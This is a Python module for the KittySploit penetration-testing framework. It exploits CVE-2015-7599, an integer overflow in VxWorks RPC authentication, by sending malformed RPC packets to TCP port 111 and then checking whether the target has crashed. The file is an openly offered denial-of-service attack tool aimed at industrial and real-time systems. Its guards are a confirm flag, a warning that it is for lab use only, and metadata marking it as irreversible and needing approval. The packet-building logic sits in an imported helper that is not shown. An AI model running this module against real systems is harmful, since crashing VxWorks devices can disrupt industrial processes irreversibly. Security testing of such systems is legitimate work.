#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
VxWorks RPC integer overflow denial of service (CVE-2015-7599).

Triggers an integer overflow in VxWorks svc_auth.c _authenticate() by sending malformed
RPC call headers over TCP port 111.
"""

from __future__ import annotations

from kittysploit import *
from lib.protocols.ics.ics_scanner_client import Ics_scanner_client
from lib.protocols.vxworks.rpc_dos_client import (
    RPC_DEFAULT_PORT,
    is_rpc_port_open,
    probe_rpc_dos,
)


class Module(Auxiliary, Ics_scanner_client):
    __info__ = {
        "name": "VxWorks RPC integer overflow DoS",
        "description": (
            "Exploits CVE-2015-7599, an integer overflow in VxWorks RPC authentication "
            "(svc_auth.c), to crash or disrupt VxWorks 5.5 through 6.9.4.1 systems with "
            "RPC enabled on TCP/111."
        ),
        "author": ["Yannick Formaggio", "wenzhe zhu", "KittySploit Team"],
        "cve": ["CVE-2015-7599"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2015-7599",
        ],
        "platform": Platform.OTHER,
        "tags": ["ics", "vxworks", "rpc", "dos", "rtos", "ot", "cve-2015-7599"],
        "agent": {
            "risk": "intrusive",
            "effects": ["denial_of_service"],
            "expected_requests": 20,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
        },
    }

    port = OptPort(RPC_DEFAULT_PORT, "RPC portmapper TCP port", True)
    count = OptInteger(20, "Number of malformed RPC packets to send", False)
    timeout = OptFloat(2.0, "Per-connection timeout in seconds", False)
    wait = OptFloat(3.0, "Seconds to wait before checking if target crashed", False)
    confirm = OptBool(False, "Confirm intentional denial-of-service attempt", True)

    def check(self):
        host = self._host()
        if not host:
            return {"vulnerable": False, "reason": "target not set", "confidence": "low"}
        if not bool(self.confirm):
            return {
                "vulnerable": False,
                "reason": "set confirm=true to acknowledge DoS attempt",
                "confidence": "high",
            }
        if not is_rpc_port_open(host, self._port(), min(float(self.timeout or 2.0), 1.0)):
            return {
                "vulnerable": False,
                "reason": f"TCP {self._port()} closed",
                "confidence": "high",
            }
        return {
            "vulnerable": True,
            "reason": "RPC port open — VxWorks RPC overflow may be reachable",
            "confidence": "low",
        }

    def run(self):
        host = self._host()
        if not host:
            print_error("Target is required")
            return False
        if not bool(self.confirm):
            print_error("Refusing to send DoS payloads without confirm=true")
            return False

        port = self._port()
        count = int(self.count or 20)
        timeout = float(self.timeout or 2.0)
        wait = float(self.wait or 3.0)

        print_warning("RPC DoS is destructive — authorized lab use only")
        if not is_rpc_port_open(host, port, min(timeout, 1.0)):
            print_error(f"Target RPC port {host}:{port} is not reachable")
            return False

        print_success("RPC port is open")
        print_status(f"Sending {count} malformed RPC packet(s) to {host}:{port}...")

        result = probe_rpc_dos(host, port, count, timeout, wait)
        packets_sent = int(result.get("packets_sent") or 0)
        if packets_sent == 0:
            print_error("Failed to deliver malformed RPC packets")
            return False

        print_status(f"Delivered {packets_sent} packet(s); waited {wait:.1f}s for target response")
        if result.get("likely_crash"):
            print_success("Target RPC service appears down — likely vulnerable to CVE-2015-7599")
            return True

        print_error("Target RPC port still reachable — not confirmed vulnerable")
        return False
